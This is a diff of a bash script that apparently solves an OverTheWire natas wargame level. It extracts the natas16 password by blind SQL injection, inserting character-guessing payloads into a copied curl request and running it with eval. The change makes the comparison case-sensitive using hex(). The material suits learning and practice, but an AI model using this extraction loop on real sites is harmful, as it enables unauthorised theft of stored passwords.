@@ -1,5 +1,5 @@
 echo "give the filename of the curl command as copied from firefox network pane"
-echo "put a * where sql queries are possible"
+echo "put INJECT where sql queries are possible"
 filename='test'
 t_string='exists'
 _curl=$(cat "$filename")
@@ -11,7 +11,7 @@ do
   for next_chr in {a..z} {A..Z} {0..9};
   do
     echo -ne "\r\033[Ktesting $found$next_chr"
-    injection="username=\"natas16\" and substr(password, 1, $i)=\"$found$next_chr\""
+    injection="username=\"natas16\" and hex(substr(password, 1, $i))=hex(\"$found$next_chr\")"
     new_curl="${_curl/INJECT/$injection}"
     response=$(eval "$new_curl")
     if [[ "$response" == *"$t_string"* ]];
